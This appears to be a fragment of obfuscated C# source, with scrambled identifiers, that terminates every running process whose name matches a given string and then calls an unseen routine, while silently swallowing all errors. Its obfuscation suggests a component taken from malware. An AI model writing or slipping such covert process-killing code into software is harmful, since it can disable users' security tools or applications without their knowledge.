using System;
using System.Diagnostics;

namespace nLpTFjJRwUBp;

public class Kgdlfuvadsm
{
	public static bool XXUEDZtmHzHYIV(Process IDutxaaSrpmq, string LWRnVPKPEiQiZmI)
	{
		try
		{
			return IDutxaaSrpmq.ProcessName.ToLower().Contains(LWRnVPKPEiQiZmI.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void hSqXDEjvolwVf(string TQQLnPKRvjLlg, string aAqCLwHOyJgbnxop)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (XXUEDZtmHzHYIV(process, TQQLnPKRvjLlg.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					RLgUMHIwwGSuCLo.ppntzUOyKXarvRo();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
